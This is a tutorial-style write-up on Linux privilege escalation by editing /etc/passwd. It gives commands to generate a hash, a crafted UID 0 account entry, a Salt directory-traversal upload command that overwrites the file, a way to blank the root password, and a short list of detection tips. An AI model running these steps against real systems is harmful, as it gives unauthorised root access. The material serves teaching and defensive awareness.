## Overview

The `/etc/passwd` file stores user account information.

Each line represents a user account with the following format:

```text
username:password:UID:GID:comment:home:shell
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
```

Key fields:

| Field | Description |
|------|------------|
| username | account name |
| password | password hash or placeholder |
| UID | user ID |
| GID | group ID |
| home | home directory |
| shell | login shell |

---

# Why This Leads to Privilege Escalation

The **root user always has UID 0**.

If we can:

- modify `/etc/passwd`
- add a new entry with UID 0
- assign a known password hash

we can create a new root user.

---

# Attack Requirements

One of the following is required:

- arbitrary file write
- command execution as root
- LFI with file write capability
- SaltStack file upload vulnerability
- writable `/etc/passwd`
- misconfigured permissions
- container breakout with mounted filesystem

---

# Generate Password Hash

MD5 example:

```bash
openssl passwd -1 password
```

Example output:

```text
$1$IrO2OGL8$6QQUJv1NMsMSVfCOtT4WU/
```

---

# Create Root User Entry

Example:

```text
swordfish:$1$IrO2OGL8$6QQUJv1NMsMSVfCOtT4WU/:0:0:root:/root:/bin/bash
```

Important values:

```text
UID = 0
GID = 0
shell = /bin/bash
```

---

# Exploitation Example – File Upload

Upload modified passwd file using Salt exploit:

```bash
python3 exploit.py \
--master 192.168.166.62 \
--upload-src passwd \
--upload-dest ../../../../../../../../../../../../../../../etc/passwd
```

Directory traversal allows overwriting system file.

---

# Switch to Root User

```bash
su swordfish
```

Enter chosen password.

Root shell obtained.

---

# Alternative Technique – Remove Root Password

Modify:

```text
root:x:0:0:root:/root:/bin/bash
```

To:

```text
root::0:0:root:/root:/bin/bash
```

Then:

```bash
su root
```

No password required.

---

# Verification

```bash
id
```

Expected:

```text
uid=0(root)
```


---

# Detection Opportunities

Defenders should monitor:

- unexpected UID 0 accounts
- changes to `/etc/passwd`
- unusual account creation
- privilege escalation anomalies
- file integrity monitoring alerts

---

# Key Takeaways

- UID 0 always equals root privileges
- password cracking often unnecessary
- arbitrary file write frequently leads to full compromise
- editing `/etc/passwd` is a common post-exploitation technique
- configuration management vulnerabilities often enable this attack
